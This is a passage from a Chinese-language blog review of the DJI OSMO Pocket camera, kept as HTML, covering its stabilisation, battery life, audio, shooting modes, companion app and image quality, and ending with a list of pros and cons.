src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]